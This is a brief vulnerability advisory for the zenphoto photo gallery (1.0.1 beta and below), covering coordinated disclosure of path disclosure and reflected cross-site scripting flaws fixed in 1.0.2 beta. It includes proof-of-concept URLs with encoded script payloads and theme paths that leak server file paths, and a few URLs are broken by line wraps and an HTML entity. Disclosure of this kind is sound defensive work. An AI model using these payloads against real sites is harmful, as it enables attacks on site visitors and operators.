Hi all,
I've found several vulnerabilities in zenphoto, which is a great and simple photo gallery.
I notified the team a month ago, and the new release (zenphoto 1.0.2 beta) fixes all the vulnerabilities.
Thanks to the team for their great application and the fixes.
http://zone14.free.fr/advisories/2/
Vendor: zenphoto
Vulnerable: zenphoto 1.0.1 beta and below
Path Disclosure
http://www.example.com/photos/themes/default/
http://www.example.com/photos/themes/testing/
which returns:
Fatal error: Call to undefined function: printgallerytitle() in /path/photos/themes/default/index.php on line 5
Cross Site Scripting and Path Disclosure
http://www.example.com/photos/zen/i.php?a=%3Cscript%3Ealert('XSS%20Vulne
rable')%3B%3C/script%3E&i=1%2Ejpg&s=thumb
Cross Site Scripting

ulnerable')%3B%3C/script%3E
http://www.example.com/photos/index.php?album=EXISTING\_ALBUM\_NAME&#8465;
='%3E%3Cscript%3Ealert('XSS%20Vulnerable')%3B%3C/script%3E
Solution
Upgrade to zenphoto 1.0.2 beta.
